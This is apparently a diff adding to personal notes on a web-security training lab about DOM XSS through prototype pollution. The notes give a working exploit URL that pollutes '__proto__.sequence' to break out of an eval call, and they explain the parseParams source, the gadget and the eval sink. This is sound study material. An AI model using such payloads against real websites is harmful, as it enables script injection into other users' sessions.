@@ -263,8 +263,50 @@ var deparam = function( params, coerce ) {
 - 2nd Challenge(DOM XSS via an alternative prototype pollution vector)-:
 
 ```url
+https://0a5b009003c8944f805d03a9008e00c1.web-security-academy.net/?__proto__.sequence=%27z%27);alert(1)}%20//
+```
+
+- Pollution source-: It has a unique way of parsing url params for setting key and value.e,g
+
+```js
+__proto__[sequence]=payload
+__proto__.sequence=payload
+```
+
+- Source code tidbits-:
+
+```js
+// Add an URL parser to JQuery that returns an object
+// This function is meant to be used with an URL like the window.location
+// Use: $.parseParams('http://mysite.com/?var=string') or $.parseParams() to parse the window.location
+// Simple variable:  ?var=abc                        returns {var: "abc"}
+// Simple object:    ?var.length=2&var.scope=123     returns {var: {length: "2", scope: "123"}}
+// Simple array:     ?var[]=0&var[]=9                returns {var: ["0", "9"]}
+// Array with index: ?var[0]=0&var[1]=9              returns {var: ["0", "9"]}
+// Nested objects:   ?my.var.is.here=5               returns {my: {var: {is: {here: "5"}}}}
+// All together:     ?var=a&my.var[]=b&my.cookie=no  returns {var: "a", my: {var: ["b"], cookie: "no"}}
+// You just cant have an object in an array, ?var[1].test=abc DOES NOT WORK
+```
+
+- Gadget(window.manager.sequence)-:
+
+```js
+window.manager = {params: $.parseParams(new URL(location)), macro(property) {
+            if (window.macros.hasOwnProperty(property))
+                return macros[property]
+        }};
+    let a = manager.sequence || 1;
+    manager.sequence = a + 1;
+
+    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
 
 ```
 
+- Sink to hit xss-:
+
+```js
+eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
+
+```
 
 -------------
